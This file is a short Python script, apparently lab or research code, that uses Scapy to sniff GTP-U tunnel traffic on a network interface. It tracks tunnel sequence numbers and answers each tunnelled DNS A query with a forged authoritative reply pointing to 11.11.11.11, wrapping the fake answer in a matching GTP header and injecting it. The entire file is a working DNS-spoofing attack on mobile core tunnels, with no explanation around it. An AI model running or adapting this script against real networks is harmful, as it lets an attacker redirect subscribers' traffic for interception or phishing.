#!/usr/bin/python

from scapy.all import *
from scapy.contrib import gtp
# from scapy_http import http
import pcap
import sys
teids = {}

def main():
    global teids
    sniffer = pcap.pcap("ens3")
    sniffer.setfilter("udp port 2152")
    for ts, pkt in sniffer:
        pkt1 = Ether(str(pkt))
        if gtp.GTP_U_Header in pkt1:
            if pkt1[IP].dst == "192.168.2.96":
                print pkt1[IP][UDP][gtp.GTP_U_Header].seq
                teids[pkt1[IP][UDP][gtp.GTP_U_Header].teid] = int(pkt1[IP][UDP][gtp.GTP_U_Header].seq)

            if DNS in pkt1:
                try:
                    if pkt1[IP][UDP][gtp.GTP_U_Header][IP][UDP][DNS].qd.qtype == 1:
                        insideIP = pkt1[IP][UDP][gtp.GTP_U_Header][IP]
                        insideUDP = pkt1[IP][UDP][gtp.GTP_U_Header][IP][UDP]
                        insideDNS = pkt1[IP][UDP][gtp.GTP_U_Header][IP][UDP][DNS]

                        spoofed_pkt = IP(dst=insideIP.src, src=insideIP.dst)/\
                            UDP(dport=insideUDP.sport, sport=insideUDP.dport)/\
                            DNS(id=insideDNS.id, qr=1, aa=1, qd=insideDNS.qd, an = DNSRR(rrname=insideDNS.qd.qname,ttl=10, rdata="11.11.11.11"))
                        gtp_header = pkt1[IP][UDP][gtp.GTP_U_Header]
                        outsideUDP = pkt1[IP][UDP]
                        outsideIP = pkt1[IP]
                        outpkt = Ether(dst=pkt1.src,src=pkt1.dst)/\
                            IP(dst=outsideIP.src, src=outsideIP.dst)/\
                            UDP(dport=outsideUDP.sport,sport=outsideUDP.dport)/\
                            gtp.GTP_U_Header(version=1,PT=1,S=1,teid=gtp_header.teid, seq=teids[gtp_header.teid]+1, length=len(spoofed_pkt)+4)/spoofed_pkt
                        sendp(outpkt, iface="ens3")
                except IndexError:
                    pkt1.show()
                    sys.exit()
                except KeyError:
                    print teids



if __name__ == "__main__":
    main()